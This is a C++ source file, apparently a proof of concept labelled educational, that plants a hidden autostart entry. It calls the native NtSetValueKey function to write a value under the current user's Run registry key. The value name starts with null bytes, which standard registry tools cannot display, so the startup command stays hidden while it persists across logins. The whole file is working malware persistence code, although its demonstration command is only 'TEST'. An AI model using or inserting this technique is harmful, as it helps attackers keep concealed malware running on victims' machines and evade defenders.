// Creates a hidden startup registry key
// Documentated in 2018 - ewhitehats
// Incomplete - fill-in values
#pragma once
#include <windows.h>
#include <string.h>
#include <iostream>

#define HIDN_KI_LGTH 10	// default is 8


// taken from docs.microsoft.com/en-us/windows/desktop/api/subauth/ns-subauth-_unicode_string
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;



// We want to use the native function call here (this version is just for educational/testing purpose), what we'll finally want to achieve
// is an unreadable registry key containing a nullbyte. We can achieve this by abusing the native API while creating the key instead of using the regular WIN API, 
// just like we do with other two operations (RegOpenKeyExW() and RegCloseKey()).
// we have to define the _NtSetValueKey() function like this, based on its native arguments and returned value (_NtSevValueKey is just the name for the type we choose here)
// so we can map the GetProcAddressA() result to a value of this type
typedef NTSTATUS(*_NtSetValueKey)(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);


void createHiddenRunKey(const WCHAR* runCmd)
{
	LSTATUS openRet = 0;
	NTSTATUS setRet = 0;
	HKEY hkResult = NULL;
	UNICODE_STRING ValueName = { 0 };

	// get the NtSetValueKey Native function address
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	_NtSetValueKey NtSetValueKey;
	NtSetValueKey = (_NtSetValueKey)GetProcAddress(hNtdll, "NtSetValueKey");


	wchar_t runkeyPath[0x100] = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	//wchar_t runkeyPath_trick[0x100] = L"smss";  // uncomment for the normal value
	wchar_t runkeyPath_trick[0x100] = L"\0\0smss";  // uncomment for the 'hidden' value

	//ValueName.Buffer = runkeyPath_trick;
	ValueName.Buffer = runkeyPath_trick;
	ValueName.Length = 2 * HIDN_KI_LGTH;
	ValueName.MaximumLength = 0;

	if (!(openRet = RegOpenKeyExW(HKEY_CURRENT_USER, runkeyPath, 0, KEY_SET_VALUE, &hkResult)))
	{
		// OK this won't work without using a Marshalling technique (to be able to call native system functions from managed code)
		if (!(setRet = NtSetValueKey(hkResult, &ValueName, 0, REG_SZ, (PVOID)runCmd, wcslen(runCmd) * 2)))
		{
			printf("SUCCESS setting hidden run value!\n");
		}
		else
		{
			printf("FAILURE setting hidden run value! (setRet == 0x%X, GLE() == %d)\n", setRet, GetLastError());
		}
		RegCloseKey(hkResult);
	}
	else

	{
		printf("FAILURE opening RUN key in registry! (openRet == 0x%X, GLE() == %d)\n", openRet, GetLastError());
	}

}

int main(int argc, char** argv) {
	wchar_t d[10] = L"TEST";
	createHiddenRunKey(d);
	return 0;
}